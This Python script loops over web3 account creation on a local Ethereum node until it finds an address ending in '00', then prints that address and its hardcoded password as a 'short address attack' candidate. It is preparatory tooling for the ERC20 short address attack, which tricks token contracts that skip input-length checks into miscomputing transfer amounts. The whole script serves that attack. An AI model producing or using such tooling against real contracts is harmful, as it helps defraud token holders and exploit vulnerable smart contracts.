from web3 import Web3
passphrase = 'changethis-password'
web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545")) # Or your provider
addr = web3.personal.newAccount(passphrase)
lbyte = addr[-2:]

while lbyte != '00':
	addr = web3.personal.newAccount(passphrase)
	lbyte = addr[-2:]

print("[+] Short address attack candidate found ")
print ("Address of a/c: "+addr)
print ("Password of a/c: "+passphrase)
